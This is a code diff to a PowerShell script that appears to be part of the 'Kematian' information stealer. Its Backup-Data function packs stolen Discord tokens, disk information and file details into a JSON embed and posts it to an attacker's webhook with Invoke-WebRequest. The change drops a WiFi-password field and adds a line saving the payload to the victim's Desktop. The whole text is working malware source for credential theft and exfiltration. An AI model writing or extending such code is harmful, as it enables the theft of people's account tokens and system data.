@@ -1125,13 +1125,9 @@ function Backup-Data {
                         "value" = "``````$alldiskinfo``````"
                     },
                     @{
-                        "name"  = ":wireless: WiFi"
-                        "value" = "``````$wifipasswords``````"
-                    }
-                    @{
                         "name"  = ":file_folder: Kematian File Info"
                         "value" = "``````$kematainwebhook``````"
-                    }
+                    },
                     @{
                         "name"  = ":key: Discord Token(s)"
                         "value" = "```````n$discord_tokens``````"
@@ -1142,6 +1138,7 @@ function Backup-Data {
     }
 
     $payload = $embed_and_body | ConvertTo-Json -Depth 10
+    $payload | Out-File "$env:USERPROFILE\Desktop\payload.json" -Force
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
     
     # Send webcam
